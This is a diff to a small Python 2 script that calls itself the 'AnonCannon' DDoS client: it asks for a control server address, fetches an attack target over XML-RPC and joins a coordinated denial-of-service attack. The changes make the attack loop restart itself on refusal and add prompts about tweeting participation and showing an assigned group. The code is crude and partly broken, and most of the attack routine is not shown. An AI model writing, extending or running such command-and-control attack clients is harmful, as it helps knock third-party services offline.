@@ -2,7 +2,7 @@
 #AnnonCannon DDoS  client
 #Take it Down!
 import xmlrpclib                       #For server communication
-import urllib                          #For the worst DDoS Algo every
+import urllib                          #For the worst DDoS Algo ever
 #ALPHA ATTACK ALGO, I PROMISE IS USE A BETTER IN THE FINAL!
 def attack():
   print "[!!!]Now attacking."
@@ -15,8 +15,8 @@ def attack():
       print "Quiting."
       exit()
     if(answer == "n"):
-      raise
-
+      print "Go back to the Attack"    #Sorry!      
+      attack()
 print "AnonCannon ALPHA 1 Client"
 print "-----------------------------------------------------------------"
 address       = raw_input("Enter your Control server>>>")
@@ -29,8 +29,10 @@ answer = raw_input("Do you want to join the Attack(y/n):")
 if(answer == "y"):
   print "Joining the Attack on:" + attack_target
   attacking = True
+  answer = raw_input("Do you want to tweet that your are attacking(y/n):")
+  group_number = cli.groups()
+  print "You are in Group:" + group_number
   attack()
 if(answer == "n"):
   print "Quiting..."
   exit()
-#ALPHA ATTACK ALGO - I PROMISE I USE A BETTER IN HE FINAL RELEASE!-!
